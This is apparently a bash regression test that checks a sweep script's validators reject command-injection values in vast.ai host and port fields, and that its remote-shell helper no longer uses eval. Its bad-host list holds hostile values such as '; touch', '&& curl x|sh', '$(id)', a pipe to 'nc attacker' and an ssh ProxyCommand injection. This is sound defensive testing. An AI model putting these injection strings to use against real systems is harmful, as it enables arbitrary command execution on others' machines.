#!/bin/bash
# sweep_untrusted_endpoint_test.sh — vast.ai API fields must never become code.
#
# `public_ipaddr`, `ssh_host` and the port come from a marketplace API whose
# values a host operator influences. They used to be interpolated into a command
# string that rsh_t ran through `eval`, so a host advertising itself as
# `1.2.3.4; touch /tmp/pwned` got arbitrary root execution ON THE COORDINATOR —
# the machine running the sweep, which holds the repo and the vast credentials.
set -u

DIR="$(cd "$(dirname "$0")/.." && pwd)"
SWEEP="$DIR/scripts/sweep.sh"
rc=0
work="$(mktemp -d)"; trap 'rm -rf "$work"' EXIT

# ---- 1. the validators reject every metacharacter that matters -------------
eval "$(awk '/^sweep_valid_host\(\) \{/,/^\}/' "$SWEEP")"
eval "$(awk '/^sweep_valid_port\(\) \{/,/^\}/' "$SWEEP")"
declare -F sweep_valid_host >/dev/null && declare -F sweep_valid_port >/dev/null \
    || { echo "FAIL: validators not found in sweep.sh"; exit 1; }

bad_hosts=(
  '1.2.3.4; touch /tmp/pwned'
  '1.2.3.4 && curl x|sh'
  '$(id)'
  '`id`'
  '1.2.3.4|nc attacker 1'
  'host with space'
  '-oProxyCommand=touch /tmp/pwned'
  ''
  $'1.2.3.4\ntouch /tmp/pwned'
)
for h in "${bad_hosts[@]}"; do
    if sweep_valid_host "$h"; then
        echo "FAIL: accepted hostile host '$h'"; rc=1
    fi
done
[ $rc -eq 0 ] && echo "ok: every hostile host form is rejected"

for h in 1.2.3.4 ssh5.vast.ai 2001:db8::1 my-host_1.example.com; do
    sweep_valid_host "$h" || { echo "FAIL: rejected legitimate host '$h'"; rc=1; }
done
echo "ok: legitimate hosts still accepted"

for p in '22; id' '' 'abc' '0' '65536' '-1' '2 2'; do
    if sweep_valid_port "$p"; then echo "FAIL: accepted bad port '$p'"; rc=1; fi
done
for p in 1 22 15022 65535; do
    sweep_valid_port "$p" || { echo "FAIL: rejected valid port '$p'"; rc=1; }
done
echo "ok: port validation accepts only 1-65535"

# ---- 2. rsh_t must not eval ------------------------------------------------
body="$(awk '/^rsh_t\(\) \{/,/^\}/' "$SWEEP")"
# Strip comments before looking for eval: the comment explaining WHY the eval
# was removed contains the word, and matching prose would fail a correct fix.
code="$(grep -v '^[[:space:]]*#' <<<"$body")"
if grep -q '\beval\b' <<<"$code"; then
    echo "FAIL: rsh_t still uses eval"; rc=1
else
    echo "ok: rsh_t does not eval"
fi
grep -q 'SSH_ARGV\[@\]' <<<"$code" \
    && echo "ok: rsh_t runs an argv array" \
    || { echo "FAIL: rsh_t does not use the argv array"; rc=1; }

# The empty-target guard must survive — it is what stops a remotely-intended
# `rm -rf` from running locally when no box came up.
grep -q 'REFUSING to run remotely-intended command locally' <<<"$body" \
    && echo "ok: the empty-target guard is intact" \
    || { echo "FAIL: lost the guard against running remote commands locally"; rc=1; }

# ---- 3. end to end: a hostile endpoint must execute nothing ---------------
# Run the real rsh_t with SSH_ARGV built the way the patched code builds it,
# pointing at a stub ssh, and prove the metacharacters reach the remote as DATA.
mkdir -p "$work/bin"
cat > "$work/bin/ssh" <<'STUB'
#!/bin/bash
# record argv exactly as received
printf '%s\n' "$@" > "$NVKVM_TEST_ARGV"
STUB
chmod +x "$work/bin/ssh"
export PATH="$work/bin:$PATH"
export NVKVM_TEST_ARGV="$work/argv"

warn() { :; }
eval "$(awk '/^rsh_t\(\) \{/,/^\}/' "$SWEEP")"
HOSTILE='1.2.3.4; touch '"$work/pwned"
# Consumed by the extracted rsh_t, not by this script directly.
# shellcheck disable=SC2034
SSH_ARGV=(ssh -p 22 "root@$HOSTILE")
rsh_t 5 'echo hello' >/dev/null 2>&1

if [ -e "$work/pwned" ]; then
    echo "FAIL: the hostile endpoint EXECUTED locally"; rc=1
else
    echo "ok: hostile endpoint executed nothing locally"
fi
if grep -qF "root@$HOSTILE" "$work/argv" 2>/dev/null; then
    echo "ok: the hostile string reached ssh as one intact argv element (data)"
else
    echo "FAIL: argv was re-split; got: $(tr '\n' '|' < "$work/argv" 2>/dev/null)"; rc=1
fi
if grep -qxF 'echo hello' "$work/argv" 2>/dev/null; then
    echo "ok: the remote command survives as exactly one argv element"
else
    echo "FAIL: remote command mangled"; rc=1
fi

# ---- 4. the guest ssh forward must be loopback-only ------------------------
RTV="$DIR/scripts/run_test_vm.sh"
if grep -q 'hostfwd=tcp:127.0.0.1:' "$RTV"; then
    echo "ok: the test guest's ssh is bound to loopback"
else
    echo "FAIL: guest ssh forward is not bound to 127.0.0.1 -- it has ubuntu:ubuntu and NOPASSWD:ALL"; rc=1
fi
if grep -qE 'hostfwd=tcp::' "$RTV"; then
    echo "FAIL: an all-interfaces hostfwd remains"; rc=1
fi

exit $rc
